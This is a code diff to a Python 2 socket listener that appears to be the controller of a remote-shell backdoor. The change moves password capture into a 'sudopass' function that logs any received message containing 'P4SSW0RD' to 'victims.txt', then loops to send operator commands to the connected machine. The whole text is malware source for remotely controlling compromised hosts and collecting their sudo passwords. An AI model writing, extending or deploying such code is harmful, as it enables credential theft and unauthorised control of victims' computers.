@@ -14,16 +14,24 @@ def sendcode(c,ac):
     data = c.recv(2048)
     if not data:
         pass
-    if data == "P4SSW0RD:":
-        file = open("victims.txt","a")
-        file.write(data)
-        file.close()
+
     else:
         print data
 c,addr = client_socket.accept()
+def sudopass(x):
+    if "P4SSW0RD" in x:
+        file = open("victims.txt","a")
+        x = x + ";"
+        file.write(x)
+        file.close()
+    else:
+        pass
+firstlogin = c.recv(2048)
+sudopass(firstlogin)
+print firstlogin
 while True:
 
-    ac = raw_input(" > \n")
+    ac = raw_input(">\n")
     ac.decode("utf-8")
     sendcode(c,ac)
 
